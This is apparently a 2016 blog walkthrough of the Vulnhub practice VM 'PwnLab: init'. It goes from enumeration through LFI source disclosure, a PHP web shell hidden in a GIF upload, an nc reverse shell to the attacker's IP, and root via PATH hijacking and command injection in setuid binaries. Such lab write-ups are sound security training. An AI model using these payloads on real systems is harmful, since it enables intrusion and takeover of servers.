---
layout: post
title: "PwnLab: init Walkthrough (Vulnhub)"
date: 2016-11-10 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough]
---

[PwnLab: init](https://www.vulnhub.com/entry/pwnlab-init,158/) is a great boot2root VM for beginner pentester. Let's get started, shall we?

## 0\. Get VM's IP

```console
root@kali:~# netdiscover -r 192.168.1.0/24  
  
 Currently scanning: Finished!   |   Screen View: Unique Hosts                  
  
 14 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 840               
 _____________________________________________________________________________  
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname       
 -----------------------------------------------------------------------------  
 192.168.1.65    08:00:27:ff:06:c9      1      60  Cadmus Computer Systems      
 ...  
```

Victim's IP: `192.168.1.65`.

## 1\. Enumeration

Let's do some enumeration! Starting by running onetwopunch script to utilize both unicornscan's fast scanning and nmap's version detection. For this b2r I only needed to enumerate services. 

### 1.1 TCP/UDP services enumeration

```console
root@kali:~/Desktop# ./onetwopunch.sh -t targets -p all -n "-sV -O --version-intensity=9"  
                             _                                          _       _  
  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \  
 / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /  
| (_) | | | |  __/ ?(ò_ó?)? | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/  
 \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/    
                                                |_|                                
                                                                   by superkojiman  
  
[+] Protocol : all  
[+] Interface: eth0  
[+] Nmap opts: -A -sV --version-intensity=9  
[+] Targets  : targets  
[+] Scanning 192.168.1.65 for all ports...  
[+] Obtaining all open TCP ports using unicornscan...  
[+] unicornscan -i eth0 -mT 192.168.1.65:a -l /root/.onetwopunch/udir/192.168.1.65-tcp.txt  
Recv [Error   packet_parse.c:335] likely bad: packet has incorrect ip length, skipping it [ip total length claims 2948 and we have 1550  
[*] TCP ports for nmap to scan: 80,111,3306,49623,  
[+] nmap -e eth0 -sV -O --version-intensity=9 -oX /root/.onetwopunch/ndir/192.168.1.65-tcp.xml -oG /root/.onetwopunch/ndir/192.168.1.65-tcp.grep -p 80,111,3306,49623, 192.168.1.65  
  
Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-09 22:56 EST  
Nmap scan report for 192.168.1.65  
Host is up (0.00020s latency).  
PORT      STATE SERVICE VERSION  
**80/tcp    open  http    Apache httpd 2.4.10 ((Debian))  
111/tcp   open  rpcbind 2-4 (RPC #100000)  
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1  
49623/tcp open  status  1 (RPC #100024)**  
MAC Address: 08:00:27:FF:06:C9 (Oracle VirtualBox virtual NIC)  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running: Linux 3.X|4.X  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
OS details: Linux 3.2 - 4.4  
Nmap done: 1 IP address (1 host up) scanned in 24.98 seconds  
  
[+] Obtaining all open UDP ports using unicornscan...  
[+] unicornscan -i eth0 -mU 192.168.1.65:a -l /root/.onetwopunch/udir/192.168.1.65-udp.txt  
[*] UDP ports for nmap to scan: 111,  
[+] nmap -e eth0 -sV -O --version-intensity=9 -sU -oX /root/.onetwopunch/ndir/192.168.1.65-udp.xml -oG /root/.onetwopunch/ndir/192.168.1.65-udp.grep -p 111, 192.168.1.65  
Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-09 23:01 EST  
Nmap scan report for 192.168.1.65  
Host is up (0.00020s latency).  
PORT    STATE SERVICE VERSION  
**111/udp open  rpcbind 2-4 (RPC #100000)**  
MAC Address: 08:00:27:FF:06:C9 (Oracle VirtualBox virtual NIC)  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running: Linux 2.4.X|2.6.X  
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6  
OS details: Linux 2.4.20, Linux 2.6.14 - 2.6.34, Linux 2.6.17 (Mandriva), Linux 2.6.23, Linux 2.6.24  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds  
[+] Scans completed  
[+] Results saved to /root/.onetwopunch  
```

What catches your eye is that there's a web server running as well as mysql. While you navigate to the webserver in your browser, don't waste that CPU power and run `nikto` and/or `dirbuster` too!

### 1.2 Scanning the web server

When there's a web server running, you'll want to do the following, of course
depending on what you need/looking for:


  1. **Investigating HTTP requests/responses**
    **Tools:** Burp Suite, Fiddler, Tamper Data/Cookies Manager+ (FF addons)
  2. **Scan for vulnerabilities (outdated version, LFI/RFI, SQLi, ...)**  
    **Tools:** Nikto, sqlmap, nmap scripts
  3. **Search for hidden/misconfigured directories or files**  
    **Tools:** Dirbuster, GoBuster, Nikto

More can be found [here](http://sectools.org/tag/web-scanners/). Way more can be found [here](http://www.google.com/).
  
Usually I start by running Nikto:  

```console
root@kali:~/Desktop# nikto -host 192.168.1.65  
- Nikto v2.1.6  
---------------------------------------------------------------------------  
+ Target IP:          192.168.1.65  
+ Target Hostname:    192.168.1.65  
+ Target Port:        80  
+ Start Time:         2016-11-09 22:54:56 (GMT-5)  
---------------------------------------------------------------------------  
+ Server: Apache/2.4.10 (Debian)  
+ The anti-clickjacking X-Frame-Options header is not present.  
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS  
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type  
+ No CGI Directories found (use '-C all' to force check all possible dirs)  
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".  
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.  
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.  
+ Cookie PHPSESSID created without the httponly flag  
**+ /config.php: PHP Config file may contain database IDs and passwords.**  
+ OSVDB-3268: /images/: Directory indexing found.  
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.  
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80  
+ OSVDB-3233: /icons/README: Apache default file found.  
**+ /login.php: Admin login page/section found.**  
+ 7535 requests: 0 error(s) and 13 item(s) reported on remote host  
+ End Time:           2016-11-09 22:55:10 (GMT-5) (14 seconds)  
---------------------------------------------------------------------------  
+ 1 host(s) tested  
```

* `config.php` is of great interest to us, as it might contain credentials to mysql or to the login form, yet investigating it shows an empty page, probably the content is only between PHP tags.
* There's a login form, same as the one shown in http://192.168.1.65/?page=login. *Possibly vulnerable to LFI*.

_____________________________________________________________________________

## 2\. Bruteforcing MySQL default credentials

Bruteforcing a service for default credentials could be very rewarding, I tried bruteforcing MySQL manually as well as using `hydra` but in vain.

```console
root@kali:~/Desktop# mysql -h 192.168.1.65 -u root -p  
Enter password: (empty)  
ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.71' (using password: NO)  
root@kali:~/Desktop# mysql -h 192.168.1.65 -u root -p  
Enter password: (root)  
ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.71' (using password: YES)  
root@kali:~/Desktop#   
```

_____________________________________________________________________________

## 3\. Checking out the web service

### 3.1 Login page**

![14]({{ site.baseurl}}/images/14.png)

Let's see if we can bypass the authentication form, using manual SQLi attacks as well as `sqlmap` seemed fruitless.

```console
root@kali:~/Desktop# sqlmap -u "http://192.168.1.65/?page=login" --data="user=abcd&pass=abcd&submit=Login" --level=5 --risk=3 --dbms=mysql  
...  
[23:20:31] [CRITICAL] all tested parameters appear to be not injectable. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')  
  
[*] shutting down at 23:20:31  
```
Damn, we need to find other ways, how about the page parameter in the url? It could be vulnerable to LFI.  
### 3.2 LFI vulnerability

Example vulnerable code:  
```php
<?php  
   if (isset($_GET['page']))  
   {  
      include($_GET['page'] . '.php');  
   }  
?>  
```
None of these worked:

  * `http://192.168.1.65/?page=/etc/passwd`
  * `http://192.168.1.65/?page=/etc/passwd`
  * `http://192.168.1.65/?page=../../../../../../../etc/passwd`
  * `http://192.168.1.65/?page=../../../../../../../etc/passwd`

Yet, the following worked!  
```
http://192.168.1.65/?page=php://filter/convert.base64-encode/resource=index  
```
  
Using PHP filters to encode the .php file content to base64 string allows us to bypass it being executed by the server.  
  
#### Config.php:

```php
<?php  
$server      = "localhost";  
$username = "root";  
$password = "H4u%QJ_H99";  
$database = "Users";  
?>  
```

Sweet! We got the MySQL credentials. Before we dump the database let's continue checking out the remaining pages.  

#### Index.php:

```php
<?php  
//Multilingual. Not implemented yet.  
//setcookie("lang","en.lang.php");  
if (isset($_COOKIE['lang']))  
{  
    include("lang/".$_COOKIE['lang']);  
}  
// Not implemented yet.  
?>  
<html>  
<head>  
<title>PwnLab Intranet Image Hosting</title>  
</head>  
<body>  
<center>  
<img src="images/pwnlab.png"><br />  
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]  
<hr/><br/>  
<?php  
    if (isset($_GET['page']))  
    {  
        include($_GET['page'].".php");  
    }  
    else  
    {  
        echo "Use this server to upload and share image files inside the intranet";  
    }  
?>  
</center>  
</body>  
</html>  
```
  
**Lines 4-6:** LFI vulnerability, if we set a cookie with name `_lang _` pointing to a file in the file system, it will be included. We don't even need to worry about it not ending in .php!
**Lines 20-23:** LFI vulnerability we already got the source code thanks to.

  
#### Upload.php

```php
<?php  
 session_start();  
 if (!isset($_SESSION['user'])) { die('You must be log in.'); }  
?>  
  
<html>  
    <body>  
        <form action='' method='post' enctype='multipart/form-data'>  
            <input type='file' name='file' id='file' />  
            <input type='submit' name='submit' value='Upload'/>  
        </form>  
    </body>  
</html>  
  
<?php  
if(isset($_POST['submit'])) {  
    if ($_FILES['file']['error'] <= 0) {  
        $filename  = $_FILES['file']['name'];  
        $filetype  = $_FILES['file']['type'];  
        $uploaddir = 'upload/';  
        $file_ext  = strrchr($filename, '.');  
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);  
        $whitelist = array(".jpg",".jpeg",".gif",".png");  
  
        if (!(in_array($file_ext, $whitelist))) {  
            die('Not allowed extension, please upload images only.');  
        }  
  
        if(strpos($filetype,'image') === false) {  
            die('Error 001');  
        }  
  
        if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {  
            die('Error 002');  
        }  
  
        if(substr_count($filetype, '/')>1){  
            die('Error 003');  
        }  
  
        $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;  
  
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {  
            echo "<img src=\"".$uploadfile."\"><br />";  
        } else {  
            die('Error 4');  
        }  
    }  
}  
  
?>  
```  
  
We haven't figured yet a way to access this page, but this page is full of juicy content we just can't skip!  

**Lines 2-3:** That's what has been denying us access.
**Lines 16-49:** Many conditions for uploading a file:
* Err 0: Whitelist for files ending with .jpg, ,jpeg, .gif and .png
* Err 1: File is not identified as an image
* Err 2: HEX signature validation?
* Err 3: File name contains '/' to avoid LFI
* Err 4: Failed to upload file

_____________________________________________________________________________

## 4\. Accessing MySQL

Alright, now that we know how to upload a backdoor, we need to be able to access this page. Let's try to access mysql remotely using the credentials we found in `config.php`.  

```console
root@kali:~/Desktop# mysql -h 192.168.1.65 -u root -p  
Enter password:  
Welcome to the MySQL monitor.  Commands end with ; or \g.  
Your MySQL connection id is 44533  
Server version: 5.5.47-0+deb8u1 (Debian)  
  
Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.  
Oracle is a registered trademark of Oracle Corporation and/or its  
affiliates. Other names may be trademarks of their respective  
owners.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
  
**mysql> use Users;**  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
**mysql> show tables;**  
+-----------------+  
| Tables_in_Users |  
+-----------------+  
| users           |  
+-----------------+  
  
1 row in set (0.00 sec)  
  
**mysql> select * from users;**  
+------+------------------+  
| user | pass             |  
+------+------------------+  
| kent | Sld6WHVCSkpOeQ== |  
| mike | U0lmZHNURW42SQ== |  
| kane | aVN2NVltMkdSbw== |  
+------+------------------+  
3 rows in set (0.00 sec)  
  
mysql>   
```

Passwords look to be in base64 format:  

  * kent: JWzXuBJJNy
  * mike: SIfdsTEn6I
  * kane: iSv5Ym2GRo

_____________________________________________________________________________
  
## 5\. Uploading a backdoor

Using any of the credentials provided allows us to access the upload page. What we want to do now is find a way to get a shell.
How about uploading a GIF containing PHP code, and include it by the LFI vulnerability we found earlier (lang cookie)?
  
#### 1\. Create fake PNG file containing PHP code.  

```php
GIF89;  
<?php system($_GET["cmd"]) ?>  
```

`GIF89` is to bypass the type check, more info [here.](https://en.wikipedia.org/wiki/List_of_file_signatures). File is stored by its md5 hash, so it's stored at `../upload/32d3ca5e23f4ccf1e4c8660c40e75f33.png`.

#### 2\. Set lang cookie to include the image we uploaded:  

```js
document.cookie="lang=../upload/32d3ca5e23f4ccf1e4c8660c40e75f33.png"  
```

#### 3\. Start a netcat listener on Kali  

```console
root@kali:~/Desktop# nc -nvlp 4444  
listening on [any] 4444 ...  
```

#### 4\. Connect to the open port  

```
http://192.168.1.65/?cmd=nc -nv 192.168.1.71 4444 -e /bin/bash  
``` 

  
#### 5\. Did we get our shell?  

```console
root@kali:~/Desktop# nc -nvlp 4444  
listening on [any] 4444 ...  
connect to [192.168.1.71] from (UNKNOWN) [192.168.1.65] 57556  
whoami  
whoami  
www-data  
python -c 'import pty; pty.spawn("/bin/bash");'  
www-data@pwnlab:/var/www/html$  
```    

#### 6\. Privilege Escalation

*I won't be discussing which attempts I made since they're countless, check [this ](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) article for useful info.*

1\. Running as kent

```console
www-data@pwnlab:/home$ ls -al  
ls -al  
total 24  
drwxr-xr-x  6 root root 4096 Mar 17  2016 .  
drwxr-xr-x 21 root root 4096 Mar 17  2016 ..  
drwxr-x---  2 john john 4096 Mar 17  2016 john  
drwxr-x---  2 kane kane 4096 Mar 17  2016 kane  
drwxr-x---  2 kent kent 4096 Mar 17  2016 kent  
drwxr-x---  2 mike mike 4096 Mar 17  2016 mike  
www-data@pwnlab:/home$ su kent  
su kent  
Password: JWzXuBJJNy  
  
kent@pwnlab:/home$ cd kent  
cd kent  
kent@pwnlab:~$ ls -al  
ls -al  
total 20  
drwxr-x--- 2 kent kent 4096 Mar 17  2016 .  
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..  
-rw-r--r-- 1 kent kent  220 Mar 17  2016 .bash_logout  
-rw-r--r-- 1 kent kent 3515 Mar 17  2016 .bashrc  
-rw-r--r-- 1 kent kent  675 Mar 17  2016 .profile  
kent@pwnlab:~$ find / -user kent 2>/dev/null  
find / -user kent 2>/dev/null  
<-- retracted -->  
/home/kent  
/home/kent/.bashrc  
/home/kent/.profile  
/home/kent/.bash_logout  
kent@pwnlab:~$ sudo -l  
sudo -l  
bash: sudo: command not found  
```

Eh, nothing useful. Kent [you suck](https://memecrunch.com/meme/6Q91R/you-suck/image.gif?w=499&c=1)!  
  

2\. Running as mike (part 1)

You'll notice that the password for mike pulled from Mysql doesn't work. We'll get back to mike later.  
  

3.Running as kane

```console
kane@pwnlab:~$ ls -al  
ls -al  
total 28  
drwxr-x--- 2 kane kane 4096 Mar 17  2016 .  
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..  
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout  
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc  
**-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike**  
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile  
kane@pwnlab:~$ file msgmike  
file msgmike  
msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped  
kane@pwnlab:~$ ./msgmike  
./msgmike  
**cat: /home/mike/msg.txt: No such file or directory**  
kane@pwnlab:~$ strings msgmike  
...  
**cat /home/mike/msg.txt**  
...  
kane@pwnlab:~$   
```

Are you thinking what I'm thinking? `msgmike` might be doing the following code:  
```C9
int main()  
{  
      system("cat /home/mike/msg.txt");  
}  
```

This is very poorly configured as `cat` command is found by searching for files with that specific name in the `PATH` environment variable. If we create a script called `cat` in a certain directory and override the `PATH` variable, we might be able to get a shell for use mike!

*If you're interested in such problems, check out root-me.org's system problems!*

```console
kane@pwnlab:~$ echo "/bin/bash" > cat  
echo "/bin/bash #" > cat  
kane@pwnlab:~$ chmod 777 cat  
chmod 777 cat  
kane@pwnlab:~$ export PATH=/home/kane  
export PATH=/home/kane  
kane@pwnlab:~$ ./msgmike  
./msgmike  
bash: dircolors: command not found  
bash: ls: command not found  
mike@pwnlab:~$   
```

#### 4\. Running as mike and becoming ~~god~~ root

You'll need to reset the PATH variable first.  

```console
mike@pwnlab:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
mike@pwnlab:~$ cd ../mike  
cd ../mike  
mike@pwnlab:/home/mike$ ls -al  
ls -al  
total 28  
drwxr-x--- 2 mike mike 4096 Mar 17  2016 .  
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..  
-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout  
-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc  
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root  
-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile  
mike@pwnlab:/home/mike$ ./msg2root  
./msg2root  
Message for root: wanna hook?  
wanna hook?  
wanna hook?  
mike@pwnlab:/home/mike$ strings msg2root  
strings msg2root  
...  
Message for root:   
/bin/echo %s >> /root/messages.txt  
...  
mike@pwnlab:/home/mike$   
```

Hmm... msg2root possibly looks like this (might not compile, don't complain!):  

```c
#include <iostream>  
  
char msg[1024];  //Let's assume no BO takes place, alrighty?  
char command[1024];   
  
int main()  
{  
 printf("Message for root: ");  
 scanf("%s", msg);  
 snprintf(command, sizeof(command), "/bin/echo %s >> /root/messages.txt", msg);  
 system(command);  
}  
```
  
Let's find a way in.  

```console
mike@pwnlab:/home/mike$ ./msg2root  
./msg2root  
Message for root: **opensesame; bash -p** **//-p to preserve current privileges**  
opensesame; bash -p  
opensesame  
bash-4.3# whoami  
whoami  
root  
bash-4.3# cd /root  
cd /root  
bash-4.3# ls -al  
ls -al  
total 20  
drwx------  2 root root 4096 Mar 17  2016 .  
drwxr-xr-x 21 root root 4096 Mar 17  2016 ..  
lrwxrwxrwx  1 root root    9 Mar 17  2016 .bash_history -> /dev/null  
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc  
----------  1 root root 1840 Mar 17  2016 flag.txt  
lrwxrwxrwx  1 root root    9 Mar 17  2016 messages.txt -> /dev/null  
lrwxrwxrwx  1 root root    9 Mar 17  2016 .mysql_history -> /dev/null  
-rw-r--r--  1 root root  140 Nov 19  2007 .profile  
bash-4.3# cat flag.txt   
cat flag.txt  
.-=~=-.                                                                 .-=~=-.  
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)  
(_ ___)  _____                             _                            (_ ___)  
(__  _) /  __ \                           | |                           (__  _)  
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)  
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)  
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)  
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)  
( _ __)                     __/ |                                       ( _ __)  
(__  _)                    |___/                                        (__  _)  
(__  _)                                                                 (__  _)  
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)  
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)  
(__  _) this challenge.                                                 (__  _)  
(_ ___)                                                                 (_ ___)  
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)  
(__  _) reading it                                                      (__  _)  
(__  _)                                                                 (__  _)  
(__  _)                                             For sniferl4bs.com  (__  _)  
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)  
(__  _)                                                                 (__  _)  
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)  
`-._.-'                                                                 `-._.-'  
bash-4.3#   
```
  
That was fun! Thanks for reading!